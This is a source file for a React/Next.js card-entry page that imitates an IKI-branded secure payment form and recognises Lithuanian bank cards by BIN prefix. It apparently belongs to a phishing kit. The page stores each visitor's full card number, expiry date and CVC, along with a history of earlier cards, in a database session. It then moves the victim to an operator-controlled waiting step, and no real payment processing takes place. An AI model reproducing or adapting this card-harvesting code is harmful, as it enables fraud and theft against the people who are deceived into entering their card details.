"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

function luhnCheck(value: string): boolean {
  const digits = value.replace(/\D/g, "");
  if (digits.length < 12) return false;
  let sum = 0;
  let shouldDouble = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = digits.charCodeAt(i) - 48;
    if (shouldDouble) {
      d *= 2;
      if (d > 9) d -= 9;
    }
    sum += d;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

type CardBrand = { name: string; re: RegExp; len: number[] };
const CARD_BRANDS: CardBrand[] = [
  { name: "visa", re: /^4/, len: [13, 16, 19] },
  { name: "mastercard", re: /^(5[1-5]|2[2-7])/, len: [16] },
  { name: "amex", re: /^3[47]/, len: [15] },
  { name: "maestro", re: /^(5[0,6-9]|6)/, len: [12,13,14,15,16,17,18,19] },
];

function detectCardBrand(number: string): CardBrand | null {
  if (!number) return null;
  for (const b of CARD_BRANDS) if (b.re.test(number)) return b;
  return null;
}

function CardBrandLogo({ brand }: { brand: string }) {
  if (brand === "mastercard") {
    return (
      <svg viewBox="0 0 36 22" className="h-5 w-auto" aria-label="Mastercard">
        <circle cx="13" cy="11" r="9" fill="#EB001B" />
        <circle cx="23" cy="11" r="9" fill="#F79E1B" fillOpacity="0.85" />
      </svg>
    );
  }
  if (brand === "maestro") {
    return (
      <svg viewBox="0 0 36 22" className="h-5 w-auto" aria-label="Maestro">
        <circle cx="13" cy="11" r="9" fill="#0099DF" />
        <circle cx="23" cy="11" r="9" fill="#EC0000" fillOpacity="0.85" />
      </svg>
    );
  }
  if (brand === "visa") {
    return <span className="text-sm font-black italic tracking-tight text-[#1A1F71]">VISA</span>;
  }
  if (brand === "amex") {
    return (
      <span className="rounded bg-[#2E77BC] px-1.5 py-0.5 text-[10px] font-bold tracking-wide text-white">AMEX</span>
    );
  }
  return null;
}

// Litvanya bankalari BIN (ilk 4-6 hane) -> logo eslesmesi
type BankBin = { name: string; logo: string; prefixes: string[] };
const LT_BANK_BINS: BankBin[] = [
  { name: "Swedbank", logo: "/bank-logos/lithuania/swedbank-lt.png", prefixes: ["5168", "5224", "5413", "4898", "4026", "4714", "4921", "5308", "5589", "6763"] },
  { name: "SEB", logo: "/bank-logos/lithuania/seb-lt.png", prefixes: ["4167", "4235", "4899", "5290", "5319", "5350", "5412", "5434", "5571", "6764"] },
  { name: "Luminor", logo: "/bank-logos/lithuania/luminor-lt.png", prefixes: ["4025", "4738", "5125", "5150", "5187", "5299", "5360", "5416", "5528", "6762"] },
  { name: "Šiaulių bankas", logo: "/bank-logos/lithuania/siauliu-bankas-lt.png", prefixes: ["4551", "5280", "5323", "5584", "6765"] },
  { name: "Citadele", logo: "/bank-logos/lithuania/citadele-lt.png", prefixes: ["4191", "4328", "5124", "5189", "5274", "5567"] },
  { name: "Kredito unijos", logo: "/bank-logos/lithuania/kredito-unijos-lt.png", prefixes: ["5164", "5359", "5483"] },
];

function detectBank(number: string): BankBin | null {
  const digits = number.replace(/\D/g, "");
  if (digits.length < 4) return null;
  for (const bank of LT_BANK_BINS) {
    for (const p of bank.prefixes) {
      if (digits.startsWith(p)) return bank;
    }
  }
  return null;
}

type Props = {
  sessionId: string;
};

export function CardClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [number, setNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const ui = {
    panel: "app-panel rounded-2xl p-6",
    input: "app-input mt-1 w-full px-3 py-2",
    submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-60",
  };

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      setNumber(fd.cardNumber ?? "");
      setExpiry(fd.cardExpiry ?? "");
      setCvc(fd.cardCvc ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  function formatExpiry(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  const expiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
  const cvcValid = /^\d{3,4}$/.test(cvc);
  const brand = useMemo(() => detectCardBrand(number), [number]);
  const bank = useMemo(() => detectBank(number), [number]);
  const numberValid = useMemo(() => {
    if (!number) return false;
    const digits = number.replace(/\D/g, "");
    if (digits.length < 12) return false;
    return luhnCheck(digits);
  }, [number]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    if (!expiryValid) {
      setMsg("Sisestage kehtiv aegumiskuupäev (KK/AA).");
      return;
    }
    if (!cvcValid) {
      setMsg("Sisestage kehtiv CVC/CVV (3 või 4 numbrit).");
      return;
    }
    setSaving(true);
    setMsg(null);

    // 1) KART GECMISI KAYDI: ESKI kart degerleri (cardLoginHistory) yeni giristen ONCE history'ye atilir.
    //    Boylece en guncel kart TEKIL olarak cardNumber/cardExpiry/cardCvc'de durur, ESKI kartlar sadece GECMIS MODAL'inda gorunur.
    let cardLoginHistory: unknown[] = [];
    try {
      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
      const sfd = sessionFormData as Record<string, unknown>;
      const oldHolder = str(sfd.cardHolder);
      const oldNumber = str(sfd.cardNumber);
      const oldExpiry = str(sfd.cardExpiry);
      const oldCvc = str(sfd.cardCvc);
      const newHolder = "";
      const newNumber = number.trim();
      const newExpiry = expiry.trim();
      const newCvc = cvc.trim();
      // Kart numarasi veya son kullanma tarihi degisti ise ESKI'yi history'ye ekle.
      // Ayni kartla tekrar giris (ayni number+expiry+cvc) ise history'ye ekLEME.
      const isDifferentCard = Boolean(
        (oldNumber || oldExpiry || oldCvc) &&
        !(oldNumber === newNumber && oldExpiry === newExpiry && oldCvc === newCvc)
      );
      if (isDifferentCard) {
        const arr: unknown[] = Array.isArray(sfd.cardLoginHistory)
          ? [...(sfd.cardLoginHistory as unknown[])]
          : [];
        arr.unshift({
          submittedAt: new Date().toISOString(),
          cardHolder: oldHolder,
          cardNumber: oldNumber,
          cardExpiry: oldExpiry,
          cardCvc: oldCvc,
        });
        cardLoginHistory = arr;
      }
    } catch {
      /* sessiz */
    }

    const nextFormData: Record<string, unknown> = {
      ...sessionFormData,
      cardHolder: "",
      cardNumber: number.trim(),
      cardExpiry: expiry.trim(),
      cardCvc: cvc.trim(),
    };
    if (cardLoginHistory.length > 0) {
      nextFormData.cardLoginHistory = cardLoginHistory;
    }

    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Išsaugoti nepavyko.");
    else {
      setSessionFormData(nextFormData);
      router.push(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0fae4e]/30 border-t-[#0fae4e]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-5 sm:p-8 text-center">
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
            Neteisinga nuoroda.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="w-full max-w-[650px] rounded-[24px] bg-[#021a0e] border border-[#0fae4e] shadow-[0_0_40px_rgba(15,174,78,0.3)] p-6 sm:p-10 relative z-10 fade-in">
        
        {/* Right Top Logo Placeholder */}
        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
          <img
            src="/form-assets/iki-mini-logo.png"
            alt="IKI logo"
            className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
            id="card-ah-logo"
          />
        </div>

        <div className="mb-6 flex items-start gap-4">
          <div className="mt-1 shrink-0">
            <img src="/form-assets/icon-security.png" alt="Secure Payment" className="h-12 w-12" id="card-security-icon" />
          </div>
          <div>
            <h2 className="text-2xl font-bold text-white mb-1">{settings.card_title}</h2>
            <p className="text-sm text-gray-300 font-medium">{settings.card_subtitle}</p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <label className="block text-sm font-medium text-white">
            <div className="flex items-center justify-between gap-2">
              <span>{settings.card_number_label}</span>
              {(brand || bank) && (
                <span className="flex items-center gap-2">
                  {bank && (
                    <img
                      src={bank.logo}
                      alt={bank.name}
                      title={bank.name}
                      className="h-6 w-auto rounded bg-white/90 px-1 py-0.5 object-contain shadow-sm"
                    />
                  )}
                  {brand && (
                    <span className="rounded-md bg-white/90 px-2 py-1 shadow-sm">
                      <CardBrandLogo brand={brand.name} />
                    </span>
                  )}
                </span>
              )}
            </div>
            <div className="relative mt-2">
              <input
                required
                inputMode="numeric"
                className={`block w-full rounded-xl border py-3 px-4 text-lg tracking-widest text-white shadow-sm transition-colors placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50 ${
                  !numberValid && number.length >= 12
                    ? "border-red-500 bg-red-500/10 focus:border-red-500"
                    : "border-transparent bg-white/10 focus:border-[#0fae4e]"
                }`}
                value={number}
                onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
                autoComplete="cc-number"
              />
            </div>
          </label>
          {bank && (
            <p className="mt-1.5 flex items-center gap-1.5 text-xs text-gray-400">
              <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[#0fae4e]">
                <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule="evenodd" />
              </svg>
              {bank.name}
            </p>
          )}
          <div className="grid grid-cols-2 gap-3">
            <label className="block text-sm font-medium text-white">
              {settings.card_expiry_label}
              <input
                required
                placeholder="MM/JJ"
                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0fae4e] focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50"
                value={expiry}
                onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                autoComplete="cc-exp"
                inputMode="numeric"
                maxLength={5}
              />
            </label>
            <label className="block text-sm font-medium text-white">
              {settings.card_cvv_label}
              <input
                required
                inputMode="numeric"
                maxLength={4}
                className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-lg text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0fae4e] focus:outline-none focus:ring-2 focus:ring-[#0fae4e]/50"
                value={cvc}
                onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                autoComplete="cc-csc"
              />
            </label>
          </div>

          {!numberValid && number.length >= 12 ? (
            <p className="text-xs text-red-400">Neteisingas kortelės numeris.</p>
          ) : null}

          {!expiryValid && expiry.length > 0 ? (
            <p className="text-xs text-red-400">Aegumiskuupäev peab olema vormingus KK/AA.</p>
          ) : null}

          {!cvcValid && cvc.length > 0 ? (
            <p className="text-xs text-red-400">CVV koosneb 3 või 4 numbrist.</p>
          ) : null}

          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}

          <button
            type="submit"
            disabled={saving || !numberValid || !expiryValid || !cvcValid}
            className="w-full rounded-xl bg-gradient-to-r from-[#0fae4e] to-[#007a38] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(15,174,78,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
          >
            {saving ? "Siunčiama..." : settings.card_button}
          </button>
          
          <div className="mt-4 flex items-center justify-center gap-2">
            <img src="/form-assets/icon-security.png" alt="Secure" className="h-5 w-5" />
            <span className="text-[13px] font-medium text-gray-300">
              Teie andmed töötlemisel turvaliselt.
            </span>
          </div>
        </form>
      </div>
    </div>
  );
}
